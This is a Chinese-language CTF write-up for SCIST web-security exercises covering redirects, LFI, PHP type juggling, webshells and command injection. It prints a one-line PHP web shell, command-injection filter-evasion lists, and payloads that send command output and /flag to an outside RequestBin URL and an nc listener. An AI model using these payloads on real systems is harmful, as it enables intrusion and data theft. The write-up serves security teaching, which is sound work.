---
title: 2020/10/24 Web Security 基礎 題解
date: 2020-10-27 22:01:59
type: Information security
---

# Web_Getting Started

## Redirect

點進去會有一個網站
有個連結按下去說可以看 flag 
按下去會發現他跳轉一下
但什麼事情都沒發生

所以我們用 curl 觀察一下

![](https://i.imgur.com/U2BdeJS.png)


觀察到那個連結是確實會導向 `flag.php` 的
但貌似又會跳轉回來

所以我們再用 curl 觀察一下

![](https://i.imgur.com/dDyHf4a.png)

發現就會有 flag 了

會跳轉的原因是 `flag.php` 設定為會 302 跳轉回到 / 下
所以瀏覽器才會看不到內容
不過我們可以用 curl 去把 browse `flag.php` 的 response 抓下來
這樣就可以不被跳轉的看到內容了

## Form

> 解法一 

點進網址後，根據提示輸入 `123`，發現被擋住了

![](https://i.imgur.com/vBh29PS.png)

透過 Chrome 的開發者工具(`右鍵>檢查`)，發現送出 `123` 會被 `javascript` 擋住

![](https://i.imgur.com/3shM31P.png)

點選 `form` 元素，在下方的 `Event Listeners` 可以把 `onsubmit` 註冊的 `return checkForm(this)` 移除

![](https://i.imgur.com/SdwMhzr.png)

再次送出就可以得到 flag

![](https://i.imgur.com/WIyTOiB.png)

> 解法二

觀察一下他的 input name 跟 method
`name = pw method = POST`

可以用 curl 送出資料且不觸發到 JavaScript

`curl -d "pw=123" http://140.110.112.78:10204/`

> 解法三

打開 Chrome 的 Develope tool
先在 form 上面打 123 
接著在 Develope tool 輸入 `document.querySelector('form').submit()`

![](https://i.imgur.com/CwER3YA.png)

這樣就會直接 submit form 裡面的東西 且不會觸發到 onsubmit 的 Js

## Shell

進入網址後，會有三個連結，先傳個檔案上去試試看

![](https://i.imgur.com/cM5cW7J.png)

點進那個連結，會發現我們的檔案路徑為 `/files/<hash>/<hash>.txt`

![](https://i.imgur.com/I0j56sT.png)

回到最一開始的 ?page 那邊，依照他讀取的方式 可以隨意測試一下讀取其他東西

![](https://i.imgur.com/Xhbvpkd.png)

觀察一下，就會發現這個網站存在 LFI 的漏洞
從錯誤頁面的截圖，和上傳一個檔案後所存在的路徑，就可以知道檔案的目錄結構

```
.
|-- index.php
|-- modes
    |-- home
    |-- about
    `-- files
`-- files
    `-- {hash1}
         `-- {hash2}.txt   
```

透過 LFI 漏洞和檔案上傳就可以得到 `SHELL`

簡單的 php shell 程式碼
```php=
<?=`$_GET[1]`?>
```

`http://140.110.112.78:10210/?page=../files/{hash1}/{hash2}.txt&1={command}`

透過 `ls` 指令可以知道 flag 在 `flag_xxxxxx.txt`

![](https://i.imgur.com/IV5ORba.png)

直接訪問 `http://140.110.112.78:10210/flag_xxxxxx.txt` 即可得到 `flag`

![](https://i.imgur.com/o5mwrkA.png)

# Web
## KAIBRO BUY
`http://140.110.112.78:2500/`

我們現在有 1000 元，但是要買到 flag 需要 99999999 元
![](https://i.imgur.com/ExTGae7.png)

對數字點右鍵，選擇檢查
![](https://i.imgur.com/mTwtK4J.png)

雖然數字本身是不能改的，但是發現到數字是直接寫在前端的，所以我們可以從 Develope tool 更改成任意值

![](https://i.imgur.com/XyBatCK.png)

賺ww
![](https://i.imgur.com/WUn8eu8.png)


## Level
題目是要我們達到 level 1000
並且我們發現到當點擊 `Click me to next level` 可以讓 level 加上 1 
![](https://i.imgur.com/ZsgL9rB.png)

當然，你可以很認真地點完這 1000 次
不過實際上我們開啟開發者工具檢查一下，會發現到 level 是記錄在 cookie 裡面
![](https://i.imgur.com/ykAoKB9.png)

所以我們可以直接修改 cookie 的值，接下來重新整理一下頁面就可以拿到 flag 囉!
![](https://i.imgur.com/srTM2sf.png)


## Secret Login
一進來就送我們 source code ，當然要來看一下囉
![](https://i.imgur.com/2lHwEiz.png)

發現到他會 `GET` 一個 `pass` 參數，並拿去跟 config.php 內的 `secret` 比較

這邊要用到 php 的小知識: 任何東西和 `null` 做比較，都會是 `true`

這邊我們將 pass 以 `pass[]` 傳過去，這時候的 `pass` 是一個未定義的陣列，所以會是 `null`

連結如下: `http://140.110.112.78:2502/?pass[]`

接下來就拿到 flag 囉!
![](https://i.imgur.com/6wwGz9R.png)

或是使用 curl

``` curl -b "level=1000" http://140.110.112.78:25501```

## Downloader
進到頁面上可以看到有三個連結，分別會下載到三種不同的怪貓貓
檢查原始碼後發現，他會連到 `download.php` ，並用任意 `GET` 檔案
![](https://i.imgur.com/cWMJhsO.png)

這裡就是漏洞所在，現在我們可以透過 `download.php` 任意下載伺服器上的檔案
因為到處猜 flag 猜不到，所以我們就先下載預設就會存在的 `index.php`
發現到他 include 了 `config.inc.php`

![](https://i.imgur.com/3cNVuog.png)

那麼就來下載看看吧

![](https://i.imgur.com/JAm3gMc.png)

## lightning
這一題其實在瀏覽過程當中經過了 302 redirect ，所以造成你看不到 flag
我們可以藉由 curl 不會被 redirect 的特性來解決

```bash=
curl -i http://140.110.112.78:2507/
```
![](https://i.imgur.com/ckaYl9E.png)

發現到他會把我們先導向到 `flag.php`

接著 curl flag.php 就可以拿到 flag 了
```bash=
curl http://140.110.112.78:2507/flag.php
```

## webshell
一進來就看到 source code
發現到他會將一串 base64 的編碼 decode 後執行
![](https://i.imgur.com/zhHImZA.png)

先來看看這串 base64 的內容吧
> system($_POST[123]);

意思是他會接收名稱為 `123` 的 `POST` ，並且送到 `system` 執行
所以說... 我們可以透過 POST 讓他執行任意指令了!
先用 find 來找找 `flag` 的位置吧!
```bash=
curl -d "123=find / -name "flag"" http://140.110.112.78:2508/
```
![](https://i.imgur.com/O0FvSjM.png)

找到位置後，直接 cat 出來就可以拿到 flag 了

## Cat Digger
這題是 command injection
可以發現他會將我們輸入的內容送去執行 dig ，並且將結果輸出到網頁上

但是因為沒有針對我們的輸入做任何 filter ，我們可以直接截斷 dig 的指令，而去執行我們指定的內容

例如 輸入 `| ls` ，就會如實執行
> bootstrap.css
> index.php

所以，跟上一題相同，我們可以先用 find 找到 flag 的位置，最後 cat 出來即可
不過這題會檔輸入 `flag` `cat` ，所以需要一點跳脫
```bash=
| find / -name "fla*"
```
```bash=
| c\at /fla*
```
```bash=
`head /fl\ag` ` 內可以直接執行指令
```
```bash=
; c\at /fla* 分號可以接更多指令
```
```bash=
&& head /fl* 前者進行完直接接後者
```
```bash=
& c\at /fl* 前者丟入背景執行 後者繼續執行
```

> 如果想看更多跳脫方式，可以參考 @MuMu 在 `Baby CMDi` 的題解

# Level 2

## vtim_cmdi

`http://140.110.112.32:31339/index.php`

也是command injection。`;`似乎會被擋掉，但可以用`||`

```
|| ls .

Here's your header :
index.nginx-debian.html
index.php
```

翻找一下就可以看到flag

```
|| cat /flag/Flag/flag
```

> source code

```htmlembedded=
<html>
<body>
<h1>HTTP Header Reader v0.008</h1>
<form action="index.php" method="POST">
    <input type="text" size="50" name="url" placeholder="URL">
    <input type="submit" value="submit">
</from>
<?php
$url = str_replace(";", "\;", $_POST['url']);
$output = shell_exec("curl -I -X GET ".$url);
if($output != ""){
    echo "<h3>Here's your header :</h3>";
    $array = explode("\n",$output);
    echo "<pre>";
    foreach($array as $str) {
       echo $str;
       echo "<br>";
    }
    echo "</pre>";
}

?>
</body>
</html>
```

## Local File Inclusion

先注意到網址 會發現他讀取網頁的方式是用GET 
所以可以很輕易的在網址指定檔案

是 LFI 比較大的問題是 不知道檔案名稱 又不知道檔案位址
所以就要開始通靈 

跳過通靈的階段 flag 是放在 /flag
所以依照上面所說 在網址後面加上 `?page=../../../../flag` 即可
最低至少要跳4層 最高無限層都可以 
發現沒辦法直接讀/flag

## BABY CMDi

稍微麻煩一點的黑箱題
貌似被擋了不少東西

看到題目 先跟著他的要求輸入 IP

![](https://i.imgur.com/o8oyMS7.png)

看起來是很正常的 `ping $_POST['ip']`
測試了一下 發現以下幾個東西會被擋掉

``` & | ; cat flag ` ```

那就來試一下 `$(sleep 3)`
成功的讓網頁 sleep 了 3 秒 表示這樣是可行的

那就試試看 `$(ls)` 發現並沒有回傳東西
可以猜測這題並不會把 system 的運行結果回顯在網頁上
於是要嘗試讓執行結果輸出到自己這邊

開始建構 Payload 
這邊使用的是 https://requestbin.net 

開一個 private 的 RequestBin

![](https://i.imgur.com/tfz1uP3.png)

那就開始建構 payload 吧

首先先讓他 curl 我的 RequestBin

`$(curl http://requestbin.net/r/1frffe51)`

接著讓他把 command 的執行結果用 POST 的方式傳到我的 RequestBin 上
這邊先示範 ls 當前資料夾

`$(curl -d "$(ls ./)" http://requestbin.net/r/1frffe51)`

> 若是 `-d $(ls ./)` 沒加上 ""
> 會導致執行結果若是出現換行就會出現 Error
> 第一行之後的每一行都會被當成新的 command 來執行

回到 RequestBin 上 refresh 就會看到 ls 的結果了

![](https://i.imgur.com/Ewqnn7O.png)

接著會遇到兩個問題
1. 這題會擋掉 cat
2. 這題也會擋掉 flag

那麼針對這兩點來分別解決

1. cat 迴避方式
    - `head` 讀取檔案
    - `diff` 比較檔案
    - `c\at` 反斜線迴避
    - `c''at` 引號內空值
    - `od` 8 進位讀取檔案
        - -a 輸出 ascii 
    - `bzmore` 讀取檔案
    - `/???/??t` == `/usr/cat`
    - `grep` 搜尋檔案內符合條件的字串
        - `-i` 忽略大小寫
        - `-P` 配合正規表達式
        - `-r` 讀取當前資料夾下所有檔案 並且尋找符合的結果
    - `tail` 讀取檔案最後的部分
    - `cut` 讀取檔案特定範圍
        - -b 輸出特定範圍的 bytes
            - `-b n` 輸出第 n 個字
            - `-b n-` 第 n 到最後一個字
            - `-b n-m` 輸出 n ~ m 的字
            - `-b -m` 輸出 m 前面的字
    - `sed` 文字內容處理
        - `sed 'r' <file>` 讀取檔案

2. flag 迴避方式
    - `./f*` == `./fl*` == `./fla*` == `./flag`
    - `./f???` == `./flag` == `./flxx`
    - `./fl\ag`
    - `./fl${wtf}ag` == `./fl''ag` wtf 未被賦值 所以為 null 
    - `a=fl b=ag ${a}${b}`
    - 使用 `grep -r` 不需要加上檔名 只需接上要尋找的字串

3. 綜合技
    - `/???/c?? ./f???`
    - `/u*r/*d ./f?*`
    - `grep -iP "{[a-zA-Z0-9_]*}" fl\ag`
    - `diff ./fl* /etc/passwd`
    - `grep -r "{"`

> 補充 : 用 Python Flask 和 webhook 建立簡單 request 接收器
> 
> 首先先建立一個 python 檔
> 
> ```python=
> from flask import Flask, request, abort
> 
> app = Flask(__name__)
> 
> @app.route("/", methods=['POST','GET'])
> def get_data():
>         body = request.get_data(as_text=True)
>         print(body)
>         return 'OK'
> 
> import os
> if __name__ == "__main__":
>     port = int(os.environ.get('PORT', 80))
>     app.run(host='0.0.0.0', port=port)
> ```
> 這個 python 可以幫我們把 Flask run 起來，並且在 `0.0.0.0:80` 上執行
> 
> 接下來要新增一個 webhook 將連結導向我們的本機端，這裡使用 ngrok
> 要先下載好 ngrok 喔!
>
> ```bash=
> ./ngrok http 80
> ```
> 
> 最後只需要將前面 curl 的連結改成在 ngrok 上看到的連結即可
> ![](https://i.imgur.com/4DxqNv4.png)
> 
> 最後我們的結果可以在 python 中看到
> ![](https://i.imgur.com/PNl0NM3.png)

> source code

```htmlembedded=
<html>
<body>
<h2>Baby CMDi</h2>

<form action="index.php" method="POST">
<input name="ip" type="text" placeholder="Enter IP" /><br />
<input type="submit" value="Submit" />
</form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['ip'])) {
 $waf = array("&", "|", ";", "`", ">", "\t", "\r", "\n", "cat", "flag");
 foreach($waf as $banner){
        if(stripos($_POST['ip'], $banner) !== FALSE) die("Get Out of Here");
 }

 $result = shell_exec("ping -c 3 " . $_POST['ip']);
 echo "<pre>" . $result . "</pre>";
}
?>
```

# Level 3

## MyPHP

> Point : php中array的特性～sha1[] = NULL

[PHP Comparisons Table](https://www.php.net/manual/en/types.comparisons.php)


```php=
<?php
highlight_file(__FILE__);

include("user.php");
// $users = Array('admin'=>'xxxx', ...)

$user = $_GET['user'];
$pass = $_GET['pass'];

if(isset($user) && isset($pass)) {
    if($users[$user] === sha1($pass))
        echo $flag;
    else
        echo "Q______________Q";
}
```
if的比較是 "===" 不能運用弱型別，要讓它都是NULL。
輸入 ```http://140.110.112.32:4010/?user=-1&pass[]=```


## youtube_viewer

> 解法一 : nc

首先看到題目
一個youtube 載入器?
輸入youtube 影片上最後段的url 題目就會幫忙把影片讀取出來

猜測code：
```curl -i 'xxx/[input]/xxx'``` or
```curl -i "xxx/[input]/xxx"``` 

可控的在中間那邊 
應該是Blind Command Injection
開始建構payload 

1. 先閉合前面
==> ```'```
2. 把後面也處理好
==> ```''```
3. 連接前後
```' + &payload && $payload = '```
4. 加上要執行的cmd
==> ```' + $payload || ls -al && $payload = '```
5. 因為結果不會print 出來 所以要回傳到自己的server
==> ```' + $payload || ls -al | nc ctf.bitx.tw 1234 && $payload = '```

**```nc ctf.bitx.tw 1234```**
是拿來跟server 建立聊天室用的

server上要執行
**```nc -l 1234```**

最終payload 
**```' + $payload || ls -al | cat /flag | nc ctf.bitx.tw 1234 && $payload = '```**

> 解法二 : double quote ( 解法解釋請見 [BABY CMDi](https://hackmd.io/feH6s4g3S0GAAuONsg3s0Q?both#BABY-CMDi)

payload: `'"$(curl http://requestbin.net/r/12zvlvr1 --data "$(ls -ahl /)")"'`


> source code

```htmlembedded=
<head>
<link href="https://fonts.googleapis.com/css?family=IM+Fell+French+Canon+SC" rel="stylesheet">
</head>
<body style="background-color: #fefad0;font-family: 'IM Fell French Canon SC', serif;font-size:20px">

<h1>Youtube Viewer</h1>

Give me a valid youtube id:
<form method="get">
<input type="text" name="v">
<input type="submit">
</form><br><br>
Example: uCLEq9V0-Yk
<br>
I will check your input is valid youtube id or not.
<br><br>
<?php
        $default="uCLEq9V0-Yk";
        if(isset($_GET['v'])) {
                $tmp = $_GET['v'];
                $res = shell_exec("curl -i 'https://img.youtube.com/vi/$tmp/0.jpg'");
                if(strpos($res, "404 Not Found") !== FALSE) {
                        echo "<h3>Q___Q  Your input seems invalid.</h3><br>";
                } else {
                        $default = $tmp;
                }
        }
?>
<iframe id="ytplayer" type="text/html" width="640" height="360"
  src="https://www.youtube.com/embed/<?php echo $default; ?>?autoplay=0"
  frameborder="0"></iframe>
<!-- hint: backend will download/view the youtube video image and check it exist or not. -->
<!-- Try more payload -->
</body>
```

協作者
> [name=MuMu]
> [name=Koios1143]
> [name=nella17]
###### tags: `Web` `SCIST`